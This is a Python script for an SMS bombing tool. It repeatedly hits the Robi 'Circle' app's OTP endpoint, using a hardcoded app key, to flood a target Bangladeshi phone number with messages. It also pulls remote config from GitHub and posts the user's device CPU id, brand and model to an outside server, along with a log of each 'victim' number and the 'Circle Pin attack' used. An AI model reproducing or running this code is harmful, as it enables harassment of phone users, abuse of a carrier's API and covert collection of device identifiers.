#Circle Pin All Device
import os,requests,time,sys,subprocess,json
from requests.structures import CaseInsensitiveDict
headersC = CaseInsensitiveDict()
headersC["x-app-key"] = "000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"
headersC["User-Agent"] = "gzip"
headersC["Content-Type"] = "application/x-www-from-urlencoded"

from all_file import api
from all_file import banner
from all_file import char as x
from all_file import clear
from all_file import colors
from all_file import randomColor as r
from all_file import device as oparetingSystem
from concurrent.futures import ThreadPoolExecutor as ThreadPool
version = "2.1.8"
oparetor =['018','016']

def run():
	try:
		toolsInfo = requests.get("https://raw.githubusercontent.com/Aru-Is-Always-King/bombing_data/main/bomber.json").json()
		cpu_id = str(subprocess.check_output("getprop ro.boot.cpuid",shell=True).decode()).replace("\n","")
		device_brand = subprocess.check_output("getprop ro.product.brand",shell=True).decode().replace("\n","")
		device_model = subprocess.check_output("getprop ro.product.model",shell=True).decode().replace("\n","")
		urlUser = toolsInfo["url"]+"/termux/device-create"
		headers = {
  'Content-Type': 'application/json'
}
		data = json.dumps({
  "cpu_id": cpu_id,
  "device_model": device_model,
  "device_brand": device_brand
})
		userStatus = requests.request("POST", urlUser, headers=headers, data=data).json()
		if userStatus["device_status"] == "active":
			banner.home.bannerPrint(version)
			while True:
				phone = str(input(f"{colors.color.greenBold}    Enter Targert Phone Number {colors.color.cyanBold}[+88]: {colors.color.end}"))
				#protact
				from all_file import protact
				protact.run(phone)
				if len(phone) != 11:
					x.printf.char(colors.color.redBold+"    Please Enter 11Digit Number.",0.01)
				elif phone[:3] not in oparetor:
					x.printf.char(colors.color.redBold+"    Enter Robi or Airtel Number.",0.01)
				elif len(phone) == 11:
					break
			while True:
				amount = int(input(f"{colors.color.greenBold}    Enter SMS Amount [{toolsInfo['smsLimit']}] {colors.color.cyanBold}: {colors.color.end}"))
				if amount <= int(toolsInfo['smsLimit']):
					break
				else:
					x.printf.char(colors.color.redBold+"    Invalid amount..",0.01)
			if toolsInfo["dailyLimit"] == "enabled":
				urlLimit = url + "limit"
				#limit api use and Complete more Task
			else:
				sentOtp(phone,amount,toolsInfo)
		else:
			x.printf.char("    "+colors.color.redBold + userStatus['message'],0.01)				
	except requests.exceptions.ConnectionError:
		print("No internet")
		
def sentOtp(phone,amount,toolsInfo):
	print(f"    {colors.color.greenBold}Total SMS Sent: {colors.color.cyanBold}",end="")
	i=0
	while i < amount:
		url = "https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=21799&app_version=78&msisdn=88"+phone
		try:
			req = requests.post(url,headers=headersC)
			time.sleep(2)
			if req.json()["rdesc"] == "App installation not allowed because user account is strictly SMS ONLY.":
				pass
			elif req.json()["rdesc"] == "OK" or req.json()["rdesc"] == "You have send too much request":
				i+=1
				print_text = "[" + str(i) + "]"
				sys.stdout.write(print_text)
				sys.stdout.flush()
				sys.stdout.write("\b" * len(print_text))
		except requests.exceptions.ConnectionError:
			print("No internet")
	url = toolsInfo["url"] +"/termux/storeBombingData"
	cpu_id = str(subprocess.check_output("getprop ro.boot.cpuid",shell=True).decode()).replace("\n","")
	device_brand = subprocess.check_output("getprop ro.product.brand",shell=True).decode().replace("\n","")
	device_model = subprocess.check_output("getprop ro.product.model",shell=True).decode().replace("\n","")
	headers = {
  'Content-Type': 'application/json'
}
	data = json.dumps({
  "cpu_id": cpu_id,
  "device_model": device_model,
  "device_brand": device_brand,
  "name":"Not Found",
  "number‎":"Not Found",
  "victim":phone,
  "amount": amount,
  "method": "Circle Pin attack."
})
	userStatus = requests.request("POST", url, headers=headers, data=data).json()
	print("["+str(amount)+"]")